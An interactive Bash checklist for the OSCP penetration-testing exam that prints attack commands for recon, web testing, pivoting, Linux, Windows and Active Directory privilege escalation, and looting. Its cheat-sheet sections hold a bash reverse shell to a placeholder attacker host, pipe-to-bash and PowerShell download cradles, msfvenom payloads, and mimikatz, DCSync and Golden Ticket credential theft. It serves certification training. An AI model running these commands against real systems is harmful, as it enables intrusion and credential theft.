#!/bin/bash
###############################################################################
#  OSCP METHODOLOGY CHECKLIST — R.A.N.C.H.
#  Recon · Attack Surface · Navigate · Compromise · Harvest
#  by Aaron "The Husky Hacker" Gaddis
#
#  Usage: ./oscp-methodology-checklist.sh [TARGET_IP]
#  Interactive checklist — tracks progress per target, saves state.
###############################################################################

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

SAVE_DIR="$HOME/.oscp-checklist"
mkdir -p "$SAVE_DIR"

TARGET="${1:-UNSET}"
SAVE_FILE="$SAVE_DIR/$(echo "$TARGET" | tr '.' '_').state"

banner() {
    clear
    echo -e "${CYAN}${BOLD}"
    cat << 'EOF'
    ____  ___    _   __________  __
   / __ \/   |  / | / / ____/ / / /
  / /_/ / /| | /  |/ / /   / /_/ /
 / _, _/ ___ |/ /|  / /___/ __  /
/_/ |_/_/  |_/_/ |_/\____/_/ /_/

 Recon · Attack Surface · Navigate · Compromise · Harvest
 ─────────────────────────────────────────────────────────
 OSCP Methodology Checklist — The Husky Hacker
 "Saddle up boys. We're headed for the brick wall."
EOF
    echo -e "${NC}"
    echo -e " ${YELLOW}Target:${NC} ${BOLD}$TARGET${NC}"
    echo -e " ${YELLOW}Date:${NC}   $(date '+%Y-%m-%d %H:%M')"
    echo ""
}

# State tracking
declare -A CHECKED

load_state() {
    if [[ -f "$SAVE_FILE" ]]; then
        while IFS='=' read -r key val; do
            CHECKED["$key"]="$val"
        done < "$SAVE_FILE"
    fi
}

save_state() {
    > "$SAVE_FILE"
    for key in "${!CHECKED[@]}"; do
        echo "${key}=${CHECKED[$key]}" >> "$SAVE_FILE"
    done
}

toggle() {
    local id="$1"
    if [[ "${CHECKED[$id]}" == "1" ]]; then
        CHECKED["$id"]="0"
    else
        CHECKED["$id"]="1"
    fi
    save_state
}

status_icon() {
    local id="$1"
    if [[ "${CHECKED[$id]}" == "1" ]]; then
        echo -e "${GREEN}[✓]${NC}"
    else
        echo -e "[ ]"
    fi
}

print_item() {
    local id="$1"
    local text="$2"
    local cmd="${3:-}"
    echo -e "  $(status_icon "$id") ${BOLD}${id}${NC}  $text"
    if [[ -n "$cmd" ]]; then
        echo -e "        ${CYAN}$cmd${NC}"
    fi
}

print_header() {
    echo ""
    echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${MAGENTA}${BOLD}  $1${NC}"
    echo -e "${MAGENTA}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
}

print_subheader() {
    echo ""
    echo -e "  ${YELLOW}${BOLD}── $1 ──${NC}"
}

section_recon() {
    print_header "R — RECON"

    print_subheader "Port Scanning"
    print_item "R01" "Quick TCP scan (top 1000)" \
        "nmap -sC -sV -oN nmap/initial $TARGET"
    print_item "R02" "Full TCP port scan" \
        "nmap -p- --min-rate 5000 -oN nmap/alltcp $TARGET"
    print_item "R03" "Targeted scan on discovered ports" \
        "nmap -p <PORTS> -sC -sV -oN nmap/targeted $TARGET"
    print_item "R04" "UDP scan (top 50)" \
        "sudo nmap -sU --top-ports 50 --min-rate 5000 -oN nmap/udp $TARGET"
    print_item "R05" "SNMP check (161/162)" \
        "snmpwalk -v2c -c public $TARGET | tee snmp_output.txt"

    print_subheader "Service Enumeration"
    print_item "R06" "FTP (21) — anonymous login / version" \
        "ftp $TARGET  # try anonymous:anonymous"
    print_item "R07" "SSH (22) — banner grab / version" \
        "ssh -v $TARGET 2>&1 | head -5"
    print_item "R08" "SMTP (25) — user enum VRFY/EXPN" \
        "smtp-user-enum -M VRFY -U users.txt -t $TARGET"
    print_item "R09" "DNS (53) — zone transfer" \
        "dig axfr @$TARGET <DOMAIN>"
    print_item "R10" "HTTP(S) (80/443/8080) — whatweb / headers" \
        "whatweb $TARGET && curl -I http://$TARGET"
    print_item "R11" "SMB (445) — null session / shares" \
        "smbclient -L //$TARGET -N && crackmapexec smb $TARGET -u '' -p '' --shares"
    print_item "R12" "RPC (111/135) — rpcclient null" \
        "rpcclient -U '' -N $TARGET -c 'enumdomusers'"
    print_item "R13" "LDAP (389/636) — anonymous bind" \
        "ldapsearch -x -H ldap://$TARGET -b '' -s base namingContexts"
    print_item "R14" "Kerberos (88) — kerbrute user enum" \
        "kerbrute userenum -d <DOMAIN> --dc $TARGET users.txt"
    print_item "R15" "NFS (2049) — showmount" \
        "showmount -e $TARGET"
    print_item "R16" "MSSQL (1433) — test creds" \
        "impacket-mssqlclient <USER>:<PASS>@$TARGET -windows-auth"
    print_item "R17" "MySQL (3306) — test creds" \
        "mysql -h $TARGET -u root -p"
    print_item "R18" "RDP (3389) — verify open" \
        "xfreerdp /v:$TARGET /u:<USER> /p:<PASS> +clipboard /cert:ignore"
    print_item "R19" "WinRM (5985/5986) — test" \
        "evil-winrm -i $TARGET -u <USER> -p <PASS>"
}

section_attack_surface() {
    print_header "A — ATTACK SURFACE"

    print_subheader "Web Enumeration"
    print_item "A01" "Directory brute force" \
        "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -o dirs.txt"
    print_item "A02" "File brute force (php/txt/html/aspx/jsp)" \
        "feroxbuster -u http://$TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,html,aspx,jsp"
    print_item "A03" "Vhost / subdomain enumeration" \
        "ffuf -u http://$TARGET -H 'Host: FUZZ.<DOMAIN>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs <SIZE>"
    print_item "A04" "Nikto scan" \
        "nikto -h http://$TARGET -o nikto.txt"
    print_item "A05" "View page source / comments" \
        "curl -s http://$TARGET | grep -iE '<!--|TODO|FIXME|password|user|key|token|api|secret'"
    print_item "A06" "robots.txt / sitemap.xml" \
        "curl -s http://$TARGET/robots.txt; curl -s http://$TARGET/sitemap.xml"
    print_item "A07" "Check for .git / .env / backup files" \
        "curl -s http://$TARGET/.git/HEAD; curl -s http://$TARGET/.env"
    print_item "A08" "CMS identification (WordPress/Joomla/Drupal)" \
        "wpscan --url http://$TARGET -e ap,at,u --api-token <TOKEN>"
    print_item "A09" "API endpoint discovery" \
        "feroxbuster -u http://$TARGET/api -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt"
    print_item "A10" "Parameter fuzzing (GET/POST)" \
        "ffuf -u 'http://$TARGET/page?FUZZ=test' -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -fs <SIZE>"

    print_subheader "Credential Gathering"
    print_item "A11" "Default credentials check" \
        "# Check cirt.net/passwords, default-password.info"
    print_item "A12" "CeWL custom wordlist from site" \
        "cewl http://$TARGET -m 5 -d 3 -w cewl_wordlist.txt"
    print_item "A13" "Username list from team/about pages" \
        "# firstname.lastname, f.lastname, first.l patterns"
    print_item "A14" "Hydra brute force (SSH/FTP/HTTP)" \
        "hydra -L users.txt -P passwords.txt $TARGET ssh -t 4"
    print_item "A15" "AS-REP Roasting (no pre-auth)" \
        "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip $TARGET -no-pass"
    print_item "A16" "Password spraying (AD)" \
        "crackmapexec smb $TARGET -u users.txt -p '<PASSWORD>' --continue-on-success"

    print_subheader "Vulnerability Identification"
    print_item "A17" "Searchsploit version check" \
        "searchsploit <SERVICE> <VERSION>"
    print_item "A18" "Google CVE search for versions" \
        "# 'software version exploit CVE'"
    print_item "A19" "Check exploit-db / GitHub PoCs" \
        "# github.com/search CVE-XXXX-XXXXX"
    print_item "A20" "SQLi testing (manual + sqlmap)" \
        "sqlmap -u 'http://$TARGET/page?id=1' --batch --dbs"
    print_item "A21" "File upload bypass testing" \
        "# ext matrix: php/phtml/php5/phar, magic bytes, Content-Type spoof"
    print_item "A22" "LFI/RFI testing" \
        "curl 'http://$TARGET/page?file=../../../etc/passwd'"
    print_item "A23" "SSTI testing" \
        "# inject {{7*7}} or \${7*7} in input fields"
    print_item "A24" "Command injection testing" \
        "# ; | \$() \`\` && || in params"
}

section_navigate() {
    print_header "N — NAVIGATE (Pivoting & Lateral Movement)"

    print_subheader "Pivoting"
    print_item "N01" "Ligolo-ng proxy setup" \
        "# Attacker: ./proxy -selfcert / Agent: ./agent -connect <ATTACKER>:11601 -ignore-cert"
    print_item "N02" "Add tunnel interface + route" \
        "# interface_add, start, ip route add <SUBNET>/24 dev ligolo"
    print_item "N03" "Chisel SOCKS proxy" \
        "# Server: chisel server -p 8080 --reverse / Client: chisel client <ATK>:8080 R:socks"
    print_item "N04" "SSH dynamic port forward" \
        "ssh -D 1080 -N user@$TARGET  # then proxychains"
    print_item "N05" "SSH local port forward" \
        "ssh -L <LOCAL>:127.0.0.1:<REMOTE> user@$TARGET"

    print_subheader "Lateral Movement (AD)"
    print_item "N06" "Pass-the-Hash" \
        "impacket-psexec <DOMAIN>/Administrator@$TARGET -hashes :<NTLM>"
    print_item "N07" "Evil-WinRM with hash" \
        "evil-winrm -i $TARGET -u Administrator -H <NTLM>"
    print_item "N08" "RDP with creds" \
        "xfreerdp /v:$TARGET /u:<USER> /p:<PASS> /cert:ignore /drive:share,/tmp"
    print_item "N09" "WMI exec" \
        "impacket-wmiexec <DOMAIN>/<USER>:<PASS>@$TARGET"
    print_item "N10" "PsExec" \
        "impacket-psexec <DOMAIN>/<USER>:<PASS>@$TARGET"
    print_item "N11" "Internal network scan from pivot" \
        "# From foothold: for i in \$(seq 1 254); do (ping -c 1 172.16.X.\$i | grep 'bytes from' &); done"
    print_item "N12" "Port scan from pivot" \
        "proxychains nmap -sT -Pn --top-ports 100 <INTERNAL_TARGET>"
}

section_compromise_linux() {
    print_header "C — COMPROMISE (Linux Privesc)"

    print_subheader "Quick Wins"
    print_item "CL01" "sudo -l (NOPASSWD / GTFOBins)" \
        "sudo -l  # check gtfobins.github.io"
    print_item "CL02" "SUID / SGID binaries" \
        "find / -perm -4000 -type f 2>/dev/null"
    print_item "CL03" "Writable /etc/passwd" \
        "ls -la /etc/passwd /etc/shadow"
    print_item "CL04" "Kernel exploits (uname -a)" \
        "uname -a && cat /etc/os-release"
    print_item "CL05" "PwnKit CVE-2021-4034" \
        "# Python one-liner or compiled binary"
    print_item "CL06" "DirtyPipe CVE-2022-0847 (5.8-5.16)" \
        "# Kernel version check first"

    print_subheader "Credential Hunting"
    print_item "CL07" "Config files with passwords" \
        "grep -rli 'password\|passwd\|secret\|key\|token' /var/www/ /opt/ /etc/ 2>/dev/null"
    print_item "CL08" "Database config files" \
        "find / -name '*.conf' -o -name '*.cfg' -o -name '*.ini' -o -name '*.env' 2>/dev/null | xargs grep -li 'pass' 2>/dev/null"
    print_item "CL09" "SSH keys" \
        "find / -name id_rsa -o -name id_ed25519 -o -name authorized_keys 2>/dev/null"
    print_item "CL10" "History files" \
        "cat ~/.bash_history ~/.mysql_history ~/.python_history 2>/dev/null"
    print_item "CL11" "Process / environment variables" \
        "ps auxwwe | grep -i pass; env"

    print_subheader "Cron & Scheduled Tasks"
    print_item "CL12" "Cron jobs" \
        "cat /etc/crontab; ls -la /etc/cron.*; crontab -l"
    print_item "CL13" "Systemd timers" \
        "systemctl list-timers --all"
    print_item "CL14" "Writable cron scripts" \
        "# Check if any cron script or its sourced config is writable"
    print_item "CL15" "Tar wildcard injection" \
        "# If cron uses tar with * in a writable dir: --checkpoint + --checkpoint-action"
    print_item "CL16" "Writable sourced config files" \
        "# Scripts that source a writable .conf → inject commands"

    print_subheader "Path & Library Hijacking"
    print_item "CL17" "PATH hijack in SUID/sudo" \
        "# If binary calls command without full path: export PATH=/tmp:\$PATH"
    print_item "CL18" "Shared library hijack (RPATH/LD_PRELOAD)" \
        "readelf -d /path/to/binary | grep RPATH; ldd /path/to/binary"
    print_item "CL19" "Python module hijack" \
        "# Writable dir in sys.path before legit module → replace module"
    print_item "CL20" "Writable service binary" \
        "# systemctl show <service> | grep ExecStart → replace binary"

    print_subheader "Container / NFS / Misc"
    print_item "CL21" "Docker group abuse" \
        "id | grep docker && docker run -v /:/mnt --rm -it alpine chroot /mnt bash"
    print_item "CL22" "NFS no_root_squash" \
        "showmount -e $TARGET; mount -t nfs $TARGET:/share /mnt"
    print_item "CL23" "Capabilities" \
        "getcap -r / 2>/dev/null"
    print_item "CL24" "Automated enumeration" \
        "# linpeas.sh / husky-privesc"

    print_subheader "Linux Shell Stabilization"
    print_item "CL25" "Upgrade shell" \
        "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; # then Ctrl+Z, stty raw -echo; fg"
}

section_compromise_windows() {
    print_header "C — COMPROMISE (Windows Privesc)"

    print_subheader "Quick Wins"
    print_item "CW01" "whoami /priv — token privileges" \
        "whoami /priv  # SeImpersonate → Potato"
    print_item "CW02" "GodPotato / SigmaPotato / PrintSpoofer" \
        "GodPotato.exe -cmd 'cmd /c whoami'"
    print_item "CW03" "Unquoted service paths" \
        "wmic service get name,displayname,pathname,startmode | findstr /i auto | findstr /i /v \"C:\\Windows\""
    print_item "CW04" "Writable service binaries" \
        "icacls <SERVICE_BINARY_PATH>"
    print_item "CW05" "Service binary path hijack (sc config)" \
        "sc config <SVC> binpath= 'cmd /c C:\\Temp\\rev.exe'"
    print_item "CW06" "AlwaysInstallElevated" \
        "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
    print_item "CW07" "SeTcbPrivilege abuse" \
        "TcbElevation.exe <ServiceName> <cmd>"

    print_subheader "Credential Hunting"
    print_item "CW08" "Mimikatz (from admin shell)" \
        "mimikatz.exe 'privilege::debug' 'sekurlsa::logonpasswords' 'exit'"
    print_item "CW09" "SAM dump" \
        "reg save HKLM\\SAM sam.bak && reg save HKLM\\SYSTEM sys.bak  # impacket-secretsdump -sam -system"
    print_item "CW10" "LSASS dump" \
        "# Task Manager → lsass.exe → Create dump file → pypykatz"
    print_item "CW11" "LaZagne (all passwords)" \
        "lazagne.exe all"
    print_item "CW12" "Saved RDP / browser credentials" \
        "cmdkey /list"
    print_item "CW13" "Sticky Notes (plum.sqlite)" \
        "# AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_*\\LocalState\\plum.sqlite"
    print_item "CW14" "KeePass database files" \
        "dir /s /b *.kdb *.kdbx  # keepass2john → hashcat/john"
    print_item "CW15" "IIS web.config" \
        "type C:\\inetpub\\wwwroot\\web.config"
    print_item "CW16" "PowerShell history" \
        "type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
    print_item "CW17" "Sublime Text sessions" \
        "# AppData\\Roaming\\Sublime Text\\Local\\Session.sublime_session"
    print_item "CW18" "XAMPP config files" \
        "type C:\\xampp\\passwords.txt; type C:\\xampp\\htdocs\\*\\config*"
    print_item "CW19" "Thunderbird emails (prefs.js)" \
        "# AppData\\Roaming\\Thunderbird\\Profiles\\*.default-release"
    print_item "CW20" "GPP cPassword (SYSVOL)" \
        "# gpp-decrypt or Get-GPPPassword"

    print_subheader "Service Exploits"
    print_item "CW21" "Argus DVR directory traversal" \
        "# EDB-45296 + weak password decrypt EDB-50130"
    print_item "CW22" "RemoteMouse RCE" \
        "# EDB-50047 / CVE-2021-35448"
    print_item "CW23" "XAMPP privilege escalation" \
        "# CVE-2020-11107 — Editor path hijack in xampp-control.ini"

    print_subheader "Automated Enumeration"
    print_item "CW24" "WinPEAS / husky-privesc" \
        "winPEASx64.exe  # or husky-privesc.ps1"
    print_item "CW25" "PowerUp.ps1" \
        "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"
    print_item "CW26" "Seatbelt" \
        ".\\Seatbelt.exe -group=all"
}

section_compromise_ad() {
    print_header "C — COMPROMISE (Active Directory)"

    print_subheader "Enumeration"
    print_item "CA01" "BloodHound collection" \
        "bloodhound-python -d <DOMAIN> -u <USER> -p <PASS> -c all -ns $TARGET"
    print_item "CA02" "BloodHound — shortest path to DA" \
        "# Shortest Paths to Domain Admins from Owned Principals"
    print_item "CA03" "LDAP enum (ldapdomaindump)" \
        "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' ldap://$TARGET"
    print_item "CA04" "AD users / groups" \
        "crackmapexec smb $TARGET -u <USER> -p <PASS> --users"
    print_item "CA05" "GPO enumeration" \
        "crackmapexec smb $TARGET -u <USER> -p <PASS> -M gpp_password"
    print_item "CA06" "husky-ad full scan" \
        "./husky-ad.sh -d <DOMAIN> -u <USER> -p <PASS> --dc $TARGET --full"

    print_subheader "Credential Attacks"
    print_item "CA07" "Kerberoasting" \
        "impacket-GetUserSPNs <DOMAIN>/<USER>:<PASS> -dc-ip $TARGET -request"
    print_item "CA08" "AS-REP Roasting" \
        "impacket-GetNPUsers <DOMAIN>/ -usersfile users.txt -dc-ip $TARGET -no-pass"
    print_item "CA09" "Password spraying" \
        "crackmapexec smb $TARGET -u users.txt -p '<PASS>' --continue-on-success"
    print_item "CA10" "Targeted Kerberoast (set SPN)" \
        "# GenericWrite on user → set SPN → roast → crack → remove SPN"
    print_item "CA11" "Shadow Credentials" \
        "# GenericWrite → pywhisker / certipy shadow auto"
    print_item "CA12" "GMSA password read" \
        "# ReadGMSAPassword → gMSADumper.py or bloodyAD"

    print_subheader "ACL Abuse Chains"
    print_item "CA13" "ForceChangePassword" \
        "bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host $TARGET set password <VICTIM> '<NEWPASS>'"
    print_item "CA14" "GenericAll / GenericWrite" \
        "# Full control → reset password, set SPN, add to group"
    print_item "CA15" "WriteDACL" \
        "# Grant yourself DCSync rights via DACL modification"
    print_item "CA16" "WriteOwner" \
        "# Take ownership → WriteDACL → full control"
    print_item "CA17" "AddMember" \
        "# Add user to privileged group"

    print_subheader "Domain Compromise"
    print_item "CA18" "DCSync" \
        "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@$TARGET -just-dc"
    print_item "CA19" "Pass-the-Hash → DC" \
        "impacket-psexec <DOMAIN>/Administrator@<DC_IP> -hashes :<NTLM>"
    print_item "CA20" "NTDS.dit dump" \
        "impacket-secretsdump <DOMAIN>/Administrator@$TARGET -hashes :<NTLM> -just-dc-ntlm"
    print_item "CA21" "Golden Ticket" \
        "impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain <DOMAIN> Administrator"
    print_item "CA22" "Constrained Delegation abuse" \
        "impacket-getST -spn <SPN> -impersonate Administrator <DOMAIN>/<USER> -hashes :<NTLM>"

    print_subheader "AD CS (Certificate Abuse)"
    print_item "CA23" "Enumerate ADCS templates" \
        "certipy find -u <USER>@<DOMAIN> -p '<PASS>' -dc-ip $TARGET"
    print_item "CA24" "ESC1 — Enrollee supplies subject" \
        "certipy req -u <USER>@<DOMAIN> -p '<PASS>' -ca <CA> -template <VULN_TPL> -upn Administrator@<DOMAIN>"
    print_item "CA25" "ESC4 → ESC1 chain" \
        "# Modify vulnerable template → make it ESC1 → request admin cert"

    print_subheader "Coercion & Relay"
    print_item "CA26" "Coerced auth (PetitPotam/PrinterBug)" \
        "python3 PetitPotam.py <LISTENER> $TARGET"
    print_item "CA27" "NTLM relay (Inveigh/Responder)" \
        "sudo responder -I <IFACE> -dwP"
    print_item "CA28" "MSSQL xp_cmdshell" \
        "# IMPERSONATE sa → EXEC sp_configure 'xp_cmdshell',1 → xp_cmdshell 'cmd'"
}

section_harvest() {
    print_header "H — HARVEST (Loot & Proof)"

    print_subheader "Flags & Screenshots"
    print_item "H01" "Capture local.txt / user.txt" \
        "cat /home/*/local.txt /home/*/user.txt 2>/dev/null; type C:\\Users\\*\\Desktop\\local.txt"
    print_item "H02" "Capture proof.txt / root.txt" \
        "cat /root/proof.txt 2>/dev/null; type C:\\Users\\Administrator\\Desktop\\proof.txt"
    print_item "H03" "Screenshot with IP proof" \
        "# hostname && whoami && ifconfig/ipconfig && cat flag"
    print_item "H04" "Record steps in notes" \
        "# Document exact exploit, commands, and creds used"

    print_subheader "Post-Exploitation"
    print_item "H05" "Dump all hashes (Mimikatz/secretsdump)" \
        "impacket-secretsdump <DOMAIN>/<USER>:<PASS>@$TARGET"
    print_item "H06" "Check for pivot opportunities" \
        "# arp -a, netstat, route, internal subnets"
    print_item "H07" "Credential reuse on other targets" \
        "crackmapexec smb <TARGETS> -u <USER> -p <PASS>"
    print_item "H08" "Look for dual-homed hosts" \
        "ifconfig / ipconfig /all — multiple NICs = pivot point"
}

section_exam_tips() {
    print_header "EXAM DAY REMINDERS"

    echo ""
    echo -e "  ${YELLOW}${BOLD}Time Management (23:45 hours)${NC}"
    echo -e "  • AD set FIRST — 40 points, spend up to 8 hours"
    echo -e "  • Then standalones — 20 pts each, 3-4 hours each"
    echo -e "  • Minimum to pass: 70 pts (AD set + 1.5 standalones)"
    echo -e "  • Take breaks every 2 hours — walk, eat, hydrate"
    echo ""
    echo -e "  ${YELLOW}${BOLD}Passing Scenarios${NC}"
    echo -e "  • AD (40) + 2 full standalones (40) = 80 ✓"
    echo -e "  • AD (40) + 1 full (20) + 1 user-only (10) = 70 ✓"
    echo -e "  • 3 full standalones (60) + AD partial = risky"
    echo ""
    echo -e "  ${YELLOW}${BOLD}If You're Stuck${NC}"
    echo -e "  • Re-read nmap output — missed port?"
    echo -e "  • Re-run enum with different wordlists"
    echo -e "  • Check for default creds on every service"
    echo -e "  • Try credential reuse across all services"
    echo -e "  • Google exact version + 'exploit' or 'CVE'"
    echo -e "  • Check GTFOBins / LOLBAS for sudo/SUID"
    echo -e "  • Enumerate INTERNAL services (ss -tlnp / netstat)"
    echo -e "  • Enumerate the FILESYSTEM — config files, backups, history"
    echo -e "  • Re-read the box name/theme — it's often a hint"
    echo ""
    echo -e "  ${YELLOW}${BOLD}Listener Setup (keep running)${NC}"
    echo -e "  • Terminal 1: nc -lvnp 443"
    echo -e "  • Terminal 2: nc -lvnp 4444"
    echo -e "  • Terminal 3: python3 -m http.server 80"
    echo ""
    echo -e "  ${YELLOW}${BOLD}File Transfer Cheat Sheet${NC}"
    echo -e "  • Linux → Attacker:  curl http://<ATK>/linpeas.sh | bash"
    echo -e "  • Win → Attacker:    certutil -urlcache -f http://<ATK>/nc.exe C:\\Temp\\nc.exe"
    echo -e "  •                    iwr -uri http://<ATK>/file -outfile C:\\Temp\\file"
    echo -e "  • SMB share:         impacket-smbserver share . -smb2support"
    echo ""
    echo -e "  ${YELLOW}${BOLD}Reverse Shell Quick Ref${NC}"
    echo -e "  • Bash:    bash -i >& /dev/tcp/<ATK>/443 0>&1"
    echo -e "  • Python:  python3 -c 'import socket,subprocess,os;...'"
    echo -e "  • PowerShell: IEX(New-Object Net.WebClient).DownloadString('http://<ATK>/rev.ps1')"
    echo -e "  • msfvenom:   msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATK> LPORT=443 -f exe -o rev.exe"
}

# ─── MAIN MENU ───────────────────────────────────────────────────────────────

load_state

show_menu() {
    banner
    echo -e "  ${BOLD}Select a section to review/check off:${NC}"
    echo ""
    echo -e "  ${CYAN}1${NC})  R — Recon"
    echo -e "  ${CYAN}2${NC})  A — Attack Surface"
    echo -e "  ${CYAN}3${NC})  N — Navigate (Pivot/Lateral)"
    echo -e "  ${CYAN}4${NC})  C — Compromise: Linux Privesc"
    echo -e "  ${CYAN}5${NC})  C — Compromise: Windows Privesc"
    echo -e "  ${CYAN}6${NC})  C — Compromise: Active Directory"
    echo -e "  ${CYAN}7${NC})  H — Harvest (Loot/Proof)"
    echo -e "  ${CYAN}8${NC})  Exam Day Tips & Cheat Sheet"
    echo -e "  ${CYAN}a${NC})  Show ALL sections"
    echo -e "  ${CYAN}p${NC})  Show progress summary"
    echo -e "  ${CYAN}r${NC})  Reset all checkmarks"
    echo -e "  ${CYAN}q${NC})  Quit"
    echo ""
}

show_progress() {
    local total=0
    local done=0
    for key in "${!CHECKED[@]}"; do
        ((total++))
        [[ "${CHECKED[$key]}" == "1" ]] && ((done++))
    done
    echo ""
    echo -e "  ${BOLD}Progress: ${GREEN}$done${NC} / ${BOLD}$total${NC} items checked"
    local pct=0
    [[ $total -gt 0 ]] && pct=$((done * 100 / total))
    echo -e "  ${BOLD}Completion: ${GREEN}${pct}%${NC}"
    echo ""
}

show_section() {
    banner
    case "$1" in
        1) section_recon ;;
        2) section_attack_surface ;;
        3) section_navigate ;;
        4) section_compromise_linux ;;
        5) section_compromise_windows ;;
        6) section_compromise_ad ;;
        7) section_harvest ;;
        8) section_exam_tips ;;
        a) section_recon; section_attack_surface; section_navigate
           section_compromise_linux; section_compromise_windows
           section_compromise_ad; section_harvest; section_exam_tips ;;
    esac
    echo ""
    echo -e "  ${YELLOW}Toggle item: type its ID (e.g. R01). 'b' = back, 'q' = quit${NC}"

    while true; do
        echo -ne "  ${BOLD}> ${NC}"
        read -r input
        case "$input" in
            b|B|back) return ;;
            q|Q|quit) echo -e "\n  ${GREEN}Stay sharp. You got this, Husky. 🐺${NC}\n"; exit 0 ;;
            *)
                if [[ -n "$input" ]]; then
                    toggle "$input"
                    echo -e "  $(status_icon "$input") ${BOLD}$input${NC} toggled"
                fi
                ;;
        esac
    done
}

# Main loop
while true; do
    show_menu
    echo -ne "  ${BOLD}Choose: ${NC}"
    read -r choice
    case "$choice" in
        [1-8]|a) show_section "$choice" ;;
        p) show_progress; echo -ne "  Press Enter..."; read -r ;;
        r)
            echo -ne "  ${RED}Reset all progress? (y/N): ${NC}"
            read -r confirm
            if [[ "$confirm" == "y" || "$confirm" == "Y" ]]; then
                CHECKED=()
                save_state
                echo -e "  ${GREEN}Reset complete.${NC}"
            fi
            sleep 1
            ;;
        q|Q) echo -e "\n  ${GREEN}Stay sharp. You got this, Husky. 🐺${NC}\n"; exit 0 ;;
        *) ;;
    esac
done
